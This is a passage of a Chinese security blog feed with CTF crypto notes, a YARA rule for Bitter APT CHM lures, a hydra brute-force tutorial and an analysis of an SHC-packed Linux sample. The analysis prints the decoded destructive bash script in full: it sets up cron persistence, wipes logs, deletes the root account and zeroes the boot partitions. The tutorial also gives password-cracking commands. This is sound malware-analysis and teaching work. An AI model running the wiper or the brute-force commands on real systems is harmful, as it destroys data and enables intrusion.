title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。它将凯撒密码的全部25种位移排序为一张表，与原字母序列共同组成26行及26列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。</p><p><img src="/2023/03/03/CTF-Crypto%E5%AF%86%E7%A0%81%E5%AD%A6/b327494746995423ab63fbc0799d2698.png" alt="b327494746995423ab63fbc0799d2698"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">例如：<br>明文：THE QUICK <span class="hljs-keyword">BROWN </span>FOX <span class="hljs-keyword">JUMPS </span>OVER THE LAZY DOG<br>密钥(循环使用，密钥越长相对破解难度越大)：CULTURE<br>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母<span class="hljs-string">&#x27;T&#x27;</span>列和密钥字母<span class="hljs-string">&#x27;C&#x27;</span>行的交点就是密文字母<span class="hljs-string">&#x27;V&#x27;</span>，以此类推。<br>密文：VBP <span class="hljs-keyword">JOZGM </span>VCHQE <span class="hljs-keyword">JQR </span>UNGGW QPPK NYI NUKR XFK<br></code></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p><h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><h4 id="AES、DES、RC4、Rabbit、3DES加密"><a href="#AES、DES、RC4、Rabbit、3DES加密" class="headerlink" title="AES、DES、RC4、Rabbit、3DES加密"></a>AES、DES、RC4、Rabbit、3DES加密</h4><p>RC4加密过程：</p><ol><li>生成伪随机数组S：长度为256，填充所有元素从0到255；</li><li>初始化状态向量：将数组S中的元素按照指定的密钥K进行一次打乱；</li><li>产生密钥流：从位置0开始，每次取出S中的一个元素，然后将其与前一个元素进行交换，并取出交换后的元素；</li><li>加密过程：将明文每一个字节和密钥流中的一个字节进行异或运算，得到密文。</li></ol><p>RC4解密过程： </p><ol><li><p>根据密钥K，生成相同的伪随机数组S； </p></li><li><p>初始化状态向量，将数组S中的元素按照密钥K进行一次打乱；</p></li><li><p>从位置0开始，每次取出S中的一个元素，并与前一个元素进行交换，取出交换后的元素；</p></li><li><p>解密过程：将密文每一个字节和密钥流中的一个字节进行异或运算，得到明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># RC4解密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">data, key</span>): <br>    key = <span class="hljs-built_in">bytes</span>(key, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    enc = ARC4.new(key)<br>    res = enc.decrypt(data)<br>    res = <span class="hljs-built_in">str</span>(res,<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure></li></ol><h3 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h3><h4 id="RSA、-DSA、-DH-和-ECC加密"><a href="#RSA、-DSA、-DH-和-ECC加密" class="headerlink" title="RSA、 DSA、 DH 和 ECC加密"></a>RSA、 DSA、 DH 和 ECC加密</h4><h3 id="哈希摘要算法"><a href="#哈希摘要算法" class="headerlink" title="哈希摘要算法"></a>哈希摘要算法</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MD4</span>：<span class="hljs-number">32</span>位的摘要算法。<span class="hljs-number">2</span>add09183d0b1dc0428701df9838fba<br><span class="hljs-attribute">MD5</span>：<span class="hljs-number">32</span>位的摘要算法。<span class="hljs-number">63</span>a9f0ea7bb98050796b649e8548184<br><span class="hljs-attribute">SHA1</span>：<span class="hljs-number">40</span>位的摘要算法。dc76e9f0c0006e8f919e0c515c66dbba3982f785<br><span class="hljs-attribute">SHA224</span>：<span class="hljs-number">56</span>位的摘要算法。<span class="hljs-number">871</span>ce144069ea0816545f52f09cd135d1182262c3b235808fa5a3281<br><span class="hljs-attribute">SHA256</span>：<span class="hljs-number">64</span>位的摘要算法。<span class="hljs-number">4813494</span>d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b<br><span class="hljs-attribute">SHA384</span>：<span class="hljs-number">96</span>位的摘要算法。<span class="hljs-number">7</span>ed8c2c790aa83d6c3e404b5368f6832c18d46a0e98b9c7a7a5e3ef823e2c9f0e310abbf6f7ea9d9d883ccb64ec2736a<br><span class="hljs-attribute">SHA512</span>：<span class="hljs-number">128</span>位的摘要算法。<span class="hljs-number">99</span>adc231b045331e514a516b4b7680f588e3823213abe901738bc3ad67b2f6fcb3c64efb93d18002588d3ccc1a49efbae1ce20cb43df36b38651f11fa75678e8<br><span class="hljs-attribute">SHA3_224</span>：<span class="hljs-number">56</span>位的摘要算法。<span class="hljs-number">3</span>e42295e89a3a84ce7ee38e2ba317aeb57ca3164459bdf48f4da0e92<br><span class="hljs-attribute">SHA3_256</span>：<span class="hljs-number">64</span>位的摘要算法。a00e4d3b352e9d11979549b9eef5dc951592f594488451e6cd86fdc4bce76a53<br><span class="hljs-attribute">SHA3_384</span>：<span class="hljs-number">96</span>位的摘要算法。aac595410801e93eadb099ac575ccc12e43be2c15e31e7991e908329e5beb0729881b3be9ccdb0eeb6eb79335ea38b6d<br><span class="hljs-attribute">SHA3_512</span>：<span class="hljs-number">128</span>位的摘要算法。<span class="hljs-number">8</span>cd824c700eb0c125fff40c8c185d14c5dfe7f32814afac079ba7c20d93bc3c082193243c420fed22ef2474fbb85880e7bc1ca772150a1f759f8ddebca77711f<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蔓灵花恶意chm yara规则</title>
    <link href="/2023/02/17/%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8Fchm-yara%E8%A7%84%E5%88%99/"/>
    <url>/2023/02/17/%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8Fchm-yara%E8%A7%84%E5%88%99/</url>
    
    <content type="html"><![CDATA[<p>近几年监测发现持续出现蔓灵花chm投放，附件以压缩包形式，标题、内容及附件名极有针对性，符合鱼叉攻击特点。</p><p><a href="https://www.freebuf.com/articles/network/271187.html">https://www.freebuf.com/articles/network/271187.html</a></p><p><strong>另：</strong>可以使用Easy CHM、HugeCHM打包chm</p><p>经测试经Easy CHM(注册后)打包的包含html的chm文件更贴合蔓灵花特点。</p><p><strong>YARA规则</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">rule Bitter_Malicious_chm<br>&#123;<br>    meta:<br>        author = <span class="hljs-string">&quot;Demo&quot;</span><br>        description = <span class="hljs-string">&quot;检测Bitter恶意CHM文档&quot;</span><br>        version = <span class="hljs-string">&quot;1.0&quot;</span><br>        <span class="hljs-built_in">date</span> = <span class="hljs-string">&quot;2023-02-16&quot;</span><br>    strings:<br>        <span class="hljs-variable">$header</span> = &#123; 49 54 53 46 03 00 00 00 60 00 00 00 01 00 00 00 &#125;<br><span class="hljs-variable">$string_doc</span> = <span class="hljs-string">&quot;doc.htm&quot;</span> nocase<br>        <span class="hljs-variable">$string_url</span> = <span class="hljs-string">&quot;#URLTBL&quot;</span><br>        <span class="hljs-variable">$string_obj</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$OBJINST</span>&quot;</span><br>        <span class="hljs-variable">$string_link</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$WWAssociativeLinks</span>&quot;</span><br>        <span class="hljs-variable">$string_LZX</span> = <span class="hljs-string">&quot;7FC28940-9D31-11D0-9B27-00A0C91E9C7C&quot;</span><br>    condition:<br>        ( <span class="hljs-variable">$header</span> at 0 ) and  ( all of ( <span class="hljs-variable">$string</span>* ) )<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>MD5</strong></p><p>AB602191E08EA8B9B18B40728252048A</p><p>A23ED54CE55C04307A5C6DF0325BD9A7</p><p>931C3BAB6B786C2C6B96A50B79BEA2D8</p><p>30D071EC3CABC80D715DB70EEBA96204</p><p>E5E6DE1B80DDC27F7BF0F3C643668359</p><p>…</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Yara</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHC打包的样本分析</title>
    <link href="/2023/02/16/SHC%E6%89%93%E5%8C%85%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2023/02/16/SHC%E6%89%93%E5%8C%85%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="样本详情"><a href="#样本详情" class="headerlink" title="样本详情"></a>样本详情</h3><table><thead><tr><th align="center">文件名</th><th align="center">abs</th></tr></thead><tbody><tr><td align="center">MD5</td><td align="center">C1D496BE65D18BABF1252DF8CCF95660</td></tr><tr><td align="center">大小</td><td align="center">538880 字节</td></tr></tbody></table><img src="image-20230215160230343.png" alt="image-20230215160230343" style="zoom: 50%;" /><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>使用winhex查看样本发现，样本存在大量空数据，本身并没有那么大。并且搜索字符串并没有发现有用信息。</p><img src="image-20230215160707540.png" alt="image-20230215160707540" style="zoom:50%;" /><p>通过ida分析，发现存在解密执行过程，初步怀疑是shell打包程序。</p><p>使用gdb进行调试</p><p><img src="/2023/02/16/SHC%E6%89%93%E5%8C%85%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230215161203037.png" alt="image-20230215161203037"></p><p>解码得到原bash，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/bash</span><br>grub2-mkstandalone <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/usr/bin/abs&#x27;</span>&gt;&gt;/etc/cron.monthly/logrotate &amp; &gt;/dev/null<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/usr/bin/abs&#x27;</span> &gt;&gt;/etc/cron.monthly/man-db.cron &amp; &gt;/dev/null<br><span class="hljs-built_in">echo</span> &gt;/etc/cron.hourly/0anacron &amp; &gt;/dev/null<br><br><span class="hljs-built_in">rm</span> -rf /usr/bin/abs &amp;&gt;/dev/null;<span class="hljs-built_in">cp</span> /usr/bin/<span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span> /usr/bin/abs  &amp;&gt;/dev/null<br><br><span class="hljs-comment">#清空日志</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">rm_sec</span></span>()<br>&#123;<br><span class="hljs-built_in">local</span> aa=(boot btmp cron dmesg lastlog secure maillog messages yum wtmp spooler tallylog)<br><span class="hljs-keyword">for</span>  i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;aa[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">rm</span> -rf  /var/log/<span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span>* &amp; &gt;/dev/null<br>    <span class="hljs-built_in">touch</span>   /var/log/<span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span><br>    <br><span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-comment">#删除启动</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">boot_del</span></span>()<br>&#123;<br><br><span class="hljs-comment"># change password</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;nofairsodestoryrebuild&#x27;</span>|passwd --stdin root &amp;&gt;/dev/null<br>  sed -i <span class="hljs-string">&#x27;/root/d&#x27;</span> /etc/passwd &amp;&gt;/dev/null<br><span class="hljs-comment"># boot del</span><br>  sed -i <span class="hljs-string">&#x27;/insmod/d&#x27;</span>  /boot/grub2/grub.cfg &amp;&gt;/dev/null<br>  umount -f /boot/efi &amp;&gt;/dev/null<br>  umount -f /boot &amp;&gt;/dev/null<br>  boot=$(lsblk|grep -Ei  <span class="hljs-string">&quot;boot$&quot;</span>|awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>|awk -F<span class="hljs-string">&#x27;─&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>  efi=$(lsblk|grep -Ei  <span class="hljs-string">&quot;efi$&quot;</span>|awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>|awk -F<span class="hljs-string">&#x27;─&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>  <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/<span class="hljs-variable">$boot</span> bs=10M count=10 &amp;&gt;/dev/null<br>  <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/<span class="hljs-variable">$efi</span> bs=10M count=10 &amp;&gt;/dev/null<br><span class="hljs-comment"># file del</span><br> <span class="hljs-built_in">rm</span> -rf /boot/ &amp;&gt;/dev/null<br> find   /etc -iname <span class="hljs-string">&quot;*con*&quot;</span>|xargs  <span class="hljs-built_in">rm</span> -rf &amp;&gt;/dev/null<br><br><span class="hljs-comment">#fake information</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$a</span> 正大黑客组织，为此次攻击事件负责 \n 高额房价，民不聊生 \n 官员腐败，民生怨恨 \n 不加改善,&quot;</span>&gt;/etc/motd &amp;&gt;&gt;/dev/null<br>&#125;<br><br><br>now=$(<span class="hljs-built_in">date</span> -d  $(<span class="hljs-built_in">date</span> -I) +%s)<br>fa=1655654400       <span class="hljs-comment">#2022-6-20 0:0:0</span><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$now</span> -gt <span class="hljs-string">&quot;<span class="hljs-variable">$fa</span>&quot;</span> ]]; <span class="hljs-keyword">then</span>     <br>   rm_sec<br>   boot_del<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;/var/log/audit.log<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$0</span> = <span class="hljs-string">&quot;grub2-mkstandalone&quot;</span> ]];<span class="hljs-keyword">then</span><br><br>   rm_sec<br>   boot_del<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;/var/log/audit.log<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>经过对比使用shc生成的其他elf结构，可以判定该文件是使用shc进行打包的bash</p><p>使用GitHub的UnSHc反编译工具失败</p><h3 id="gzexe"><a href="#gzexe" class="headerlink" title="gzexe"></a>gzexe</h3><p>gzexe命令是linux自带的，用于压缩执行文件的程序。当执行被压缩过的执行文件时，该文件会自动解压然后继续执行，和使用一般的执行文件相同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gzexe tesh.sh     #加密<br>gzexe -d tesh.sh   #解密<br></code></pre></td></tr></table></figure><p>加密完成后，test.sh即加密后的文件，同时源文件备份为test.sh~。</p><p>加密前test.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to linux world&quot;</span><br></code></pre></td></tr></table></figure><p>加密后test.sh</p><img src="image-20230215150940838.png" alt="image-20230215150940838" style="zoom:50%;" /><h3 id="SHC"><a href="#SHC" class="headerlink" title="SHC"></a>SHC</h3><p>SHC是一个将bash等脚本打包成二进制文件执行的工具，由于其执行脚本的方式不需要脚本文件落地，且在打包的二进制文件中加密脚本内容，在静态文件中没有脚本的痕迹，很多恶意文件利用该工具完成恶意行为，常规的恶意软件检测也难以判黑。</p><p>使用shc之前需要提前安装gcc</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install gcc<br>sudo apt-<span class="hljs-built_in">get</span> install shc<br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">shc -f <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span> -o <span class="hljs-keyword">test</span>.bin<br></code></pre></td></tr></table></figure><p><img src="/2023/02/16/SHC%E6%89%93%E5%8C%85%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230215151446047.png" alt="image-20230215151446047"></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ELF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>暴力破解</title>
    <link href="/2023/02/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2023/02/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><strong>前言</strong></p><p>弱口令攻击应该是最常见、最简单的攻击手段，但在网络监测过程中，就发现经常发生通过弱口令进入系统内部的事情。简而言之，就是利用运维人员的愚蠢成就攻击者。</p><p><strong>hydra</strong></p><p>hydra是著名黑客组织thc的一款开源的暴力破解密码工具，功能非常强大，kali下是默认安装的，几乎支持所有协议的在线破解，例如Telnet、Ftp、Http、Https、Http-proxy、 Mssql、Mysql等。密码能否破解，在于字典是否强大。</p><p><strong>常用命令参数</strong></p><p>hydra -h   帮助命令</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-literal">-</span>R  <span class="hljs-comment">#继续从上一次进度接着破解。</span><br><span class="hljs-literal">-</span>S  <span class="hljs-comment">#采用SSL链接。</span><br><span class="hljs-literal">-</span>s  <span class="hljs-comment">#PORT 可通过这个参数指定非默认端口。</span><br><span class="hljs-literal">-</span>l  <span class="hljs-comment">#LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="hljs-literal">-</span>L  <span class="hljs-comment">#FILE 指定用户名字典。</span><br><span class="hljs-literal">-</span>p  <span class="hljs-comment">#PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="hljs-literal">-</span>P  <span class="hljs-comment">#FILE 大写，指定密码字典。</span><br><span class="hljs-literal">-</span>e  <span class="hljs-comment">#ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="hljs-literal">-</span>C  <span class="hljs-comment">#FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="hljs-literal">-</span>M  <span class="hljs-comment">#FILE 指定目标列表文件一行一条。</span><br><span class="hljs-literal">-</span>o  <span class="hljs-comment">#FILE 指定结果输出文件。</span><br><span class="hljs-literal">-</span>f  <span class="hljs-comment">#在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="hljs-literal">-</span>t  <span class="hljs-comment">#TASKS 同时运行的线程数，默认为16。</span><br><span class="hljs-literal">-</span>w  <span class="hljs-comment">#TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="hljs-literal">-</span>v/-V <span class="hljs-comment">#显示详细过程。</span><br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Examples:<br>  hydra -l user -P passlist<span class="hljs-selector-class">.txt</span> ftp:<span class="hljs-comment">//192.168.0.1</span><br>  hydra -L userlist<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> defaultpw imap:<span class="hljs-comment">//192.168.0.1/PLAIN</span><br>  hydra -C defaults<span class="hljs-selector-class">.txt</span> -<span class="hljs-number">6</span> pop3s:<span class="hljs-comment">//[2001:db8::1]:143/TLS:DIGEST-MD5</span><br>  hydra -l admin -<span class="hljs-selector-tag">p</span> password ftp:<span class="hljs-comment">//[192.168.0.0/24]/</span><br>  hydra -L logins<span class="hljs-selector-class">.txt</span> -P pws<span class="hljs-selector-class">.txt</span> -M targets<span class="hljs-selector-class">.txt</span> ssh<br></code></pre></td></tr></table></figure><p><strong>图形化界面</strong></p><img src="image-20230214145424889.png" alt="image-20230214145424889" style="zoom: 67%;" /><p><strong>SSH暴力破解</strong></p><p><img src="/2023/02/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20230214153408508.png" alt="image-20230214153408508"></p><p><strong>MYSQL暴力破解</strong></p><p><img src="/2023/02/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20230214153438375.png" alt="image-20230214153438375"></p><p><strong>注意</strong>：即使目标打开了3306端口，mysql服务也不一定允许远程登陆；即使允许远程登陆，mysql的默认 max_connect_errors 值也会阻止连接。</p><p><strong>Windows远程桌面暴力破解</strong></p><p><img src="/2023/02/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20230214164440530.png" alt="image-20230214164440530"></p><p>可以使用kali自带的crunch工具生成字典——个人感觉用处不大，建议github——字典，白嫖。</p><p>另外Metasploit(MSF)和Burp Suite(BP)也可以用来暴力破解，其中后者用于web暴力破解。</p><p><em>本文仅从安全角度去讲解工具的使用，请勿用于非法用途。</em></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hydra</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编笔记</title>
    <link href="/2023/02/13/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/02/13/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>机器语言</strong>（machinelanguage）是一种数字语言，专门设计成能被计算机处理器（CPU）理解。所有x86处理器都理解共同的机器语言。</p><p><strong>汇编语言</strong>（assemblylanguage）包含用短助记符如ADD、MOV、SUB和CALL书写的语句。汇编语言与机器语言是一对一（one-to-one）的关系：每一条汇编语言指令对应一条机器语言指令。</p><p><strong>汇编器</strong>（assembler）是一种工具程序，用于将汇编语言源程序转换为机器语言。</p><p>**常用的汇编编译器 **有MASM（ Microsoft 宏汇编器）、TASM（Turbc汇编器），NASM（NetWide汇编器）和MASM32（MASM的一种变体）。GAS（GNU汇编器）和NASM是两种基于Linux的汇编器。在这些汇编器中，NASM的语法与MASM的最相似。</p><p><strong>链接器</strong>（linker）是一种工具程序，它把汇编器生成的单个文件组合为一个可执行程序。</p><p>高级语言如Python、C++和Java与汇编语言和机器语言的关系是一对多（one-to-many）。比如，C++的一条语句就会扩展为多条汇编指<br>令或机器指令。</p><h2 id="X86处理器"><a href="#X86处理器" class="headerlink" title="X86处理器"></a>X86处理器</h2><p>中央处理单元（CPU）处理算术和逻辑运算。它包含了有限数量的存储位置，即寄存器；一个高频时钟用于同步其操作；一个控制单元和一个算术逻辑单元。内存存储单元在计算机程序运行时，保存指令和数据。总线是一组并行线路，在计算机不同部件之间传输数据。</p><p><img src="/2023/02/13/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/%E5%BE%AE%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A1%86%E5%9B%BE.png" alt="image-20230207141550992"></p><h3 id="32位x86处理器"><a href="#32位x86处理器" class="headerlink" title="32位x86处理器"></a>32位x86处理器</h3><p><strong>基本程序运行寄存器</strong>由4类寄存器组成。具体包括8个通用寄存器，6个段寄存器，1个EFLAGS寄存器（标志寄存器）以及1个指令指针寄存器。</p><ul><li>通用寄存器主要用于算术运算、数据传输和逻辑操作。</li><li>段寄存器存放预先分配的内存区域的基址，这些内存区域就是段。</li><li>标志寄存器包含的独立二进制位用于控制CPU的操作，并反映ALU操作的结果。</li><li>指令指针寄存器存放的是下一条要执行指令的地址。</li></ul><p>其他寄存器还包括<strong>控制寄存器</strong>（CR0、CR1、CR2、CR3）、<strong>调试寄存器</strong>（DR0-DR7）、<strong>系统地址寄存器</strong>、 <strong>浮点寄存器</strong>等。</p><p><strong>通用寄存器</strong>是一种通用型的寄存器，用于传送和暂存数据，也可参与算数逻辑运算，并保存计算结果。</p><table><thead><tr><th>寄存器</th><th>名称</th><th>32位</th><th>16位</th><th>高8位</th><th>低8位</th><th>主要用途</th></tr></thead><tbody><tr><td>EAX</td><td>累加器</td><td>EAX</td><td>AX</td><td>AH</td><td>AL</td><td>针对操作数和结果数据</td></tr><tr><td>EBX</td><td>基址寄存器</td><td>EBX</td><td>BX</td><td>BH</td><td>BL</td><td>DS段中的数据指针</td></tr><tr><td>ECX</td><td>计数器</td><td>ECX</td><td>CX</td><td>CH</td><td>CL</td><td>字符串和循环操作</td></tr><tr><td>EDX</td><td>数据寄存器</td><td>EDX</td><td>DX</td><td>DH</td><td>DL</td><td>I&#x2F;O指针</td></tr><tr><td>ESI</td><td>源变址寄存器</td><td>ESI</td><td>SI</td><td>-</td><td>-</td><td>字符串操作源指针</td></tr><tr><td>EDI</td><td>字符串操作目标指针</td><td>EDI</td><td>DI</td><td>-</td><td>-</td><td>字符串操作目标寄存器</td></tr><tr><td>EBP</td><td>扩展基址指针寄存器</td><td>EBP</td><td>BP</td><td>-</td><td>-</td><td>SS段中栈内数据指针</td></tr><tr><td>ESP</td><td>栈指针寄存器</td><td>ESP</td><td>SP</td><td>-</td><td>-</td><td>栈指针寄存器</td></tr></tbody></table><p><strong>段寄存器</strong> IA-32 的保护模式中，段是一种内存保护技术，它把内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等，以保护内存。此外同分页技术一起用于将虚拟内存变更为实际物理内存。段内存记录在 SDT（Segment Descriptor Table，段描述符表）中，而<strong>段寄存器</strong>就持有这些 SDT 的索引。</p><table><thead><tr><th>寄存器</th><th>名称</th><th>用途</th></tr></thead><tbody><tr><td>CS</td><td>Code Segment</td><td>代码段寄存器</td></tr><tr><td>SS</td><td>Stack Segment</td><td>栈段寄存器</td></tr><tr><td>DS</td><td>Data Segment</td><td>数据段寄存器</td></tr><tr><td>ES</td><td>Extra ( Data ) Segment</td><td>附加（数据）段寄存器</td></tr><tr><td>FS</td><td>Data Segment</td><td>数据段寄存器</td></tr><tr><td>GS</td><td>Data Segment</td><td>数据段寄存器</td></tr></tbody></table><p><strong>EFLAGS寄存器</strong> 